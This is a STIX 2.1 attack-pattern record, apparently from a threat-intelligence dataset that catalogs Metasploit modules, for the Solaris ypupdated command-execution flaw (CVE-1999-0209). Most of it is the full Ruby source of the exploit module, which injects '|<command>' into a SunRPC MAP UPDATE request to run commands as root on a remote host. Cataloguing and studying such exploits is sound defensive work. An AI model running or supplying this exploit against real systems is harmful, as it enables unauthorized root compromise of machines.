{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cb33cb76-1978-4e26-ab8b-2947ec85fad6",
    "created": "2024-08-14T16:33:53.936091Z",
    "modified": "2024-08-14T16:33:53.936095Z",
    "name": "Solaris ypupdated Command Execution",
    "description": " This exploit targets a weakness in the way the ypupdated RPC application uses the command shell when handling a MAP UPDATE request.  Extra commands may be launched through this command shell, which runs as root on the remote host, by passing commands in the format '|<command>'.  Vulnerable systems include Solaris 2.7, 8, 9, and 10, when ypupdated is started with the '-i' command-line option. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/solaris/sunrpc/ypupdated_exec.rb",
            "external_id": "ypupdated_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "1999-0209"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::SunRPC\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Solaris ypupdated Command Execution',\n      'Description'    => %q{\n        This exploit targets a weakness in the way the ypupdated RPC\n        application uses the command shell when handling a MAP UPDATE\n        request.  Extra commands may be launched through this command\n        shell, which runs as root on the remote host, by passing\n        commands in the format '|<command>'.\n\n        Vulnerable systems include Solaris 2.7, 8, 9, and 10, when\n        ypupdated is started with the '-i' command-line option.\n      },\n      'Author'         => [ 'I)ruid <druid[at]caughq.org>' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '1999-0209'],\n          ['OSVDB', '11517'],\n          ['BID', '1749'],\n        ],\n      'Privileged'     => true,\n      'Platform'       => %w{ solaris unix },\n      'Arch'           => ARCH_CMD,\n      'Payload'        =>\n        {\n          'Space'    => 1024,\n          'DisableNops' => true,\n          'Compat'      =>\n            {\n              'PayloadType' => 'cmd',\n              'RequiredCmd' => 'generic perl telnet',\n            }\n        },\n      'Targets'        => [ ['Automatic', { }], ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '1994-12-12'\n    ))\n\n    register_options(\n      [\n        OptString.new('HOSTNAME', [false, 'Remote hostname', 'localhost']),\n        OptInt.new('GID', [false, 'GID to emulate', 0]),\n        OptInt.new('UID', [false, 'UID to emulate', 0])\n      ], self.class\n    )\n  end\n\n  def exploit\n    hostname  = datastore['HOSTNAME']\n    program   = 100028\n    progver   = 1\n    procedure = 1\n\n    print_status('Sending PortMap request for ypupdated program')\n    pport = sunrpc_create('udp', program, progver)\n\n    print_status(\"Sending MAP UPDATE request with command '#{payload.encoded}'\")\n    print_status('Waiting for response...')\n    sunrpc_authunix(hostname, datastore['UID'], datastore['GID'], [])\n    command = '|' + payload.encoded\n    msg = Rex::Encoder::XDR.encode(command, 2, 0x78000000, 2, 0x78000000)\n    sunrpc_call(procedure, msg)\n\n    sunrpc_destroy\n\n    print_status('No Errors, appears to have succeeded!')\n  rescue ::Rex::Proto::SunRPC::RPCTimeout\n    print_warning('Warning: ' + $!)\n  end\nend\n",
    "x_mitre_disclosure_date": "1994-12-12",
    "x_mitre_platforms": [
        "%w{ solaris unix }"
    ]
}